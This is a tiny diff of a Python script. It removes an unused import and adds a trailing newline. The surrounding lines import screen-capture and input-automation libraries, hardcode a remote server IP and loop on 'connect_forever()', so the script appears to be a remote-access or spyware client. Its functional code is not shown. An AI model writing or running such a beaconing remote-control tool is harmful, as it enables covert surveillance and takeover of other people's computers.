@@ -7,7 +7,6 @@ from PIL import ImageGrab
 import pyautogui
 import threading
 import os
-import sys
 import requests
 
 SERVER_IP = '176.106.246.150' 
@@ -195,3 +194,4 @@ def connect_forever():
 
 if __name__ == '__main__':
     connect_forever()
+
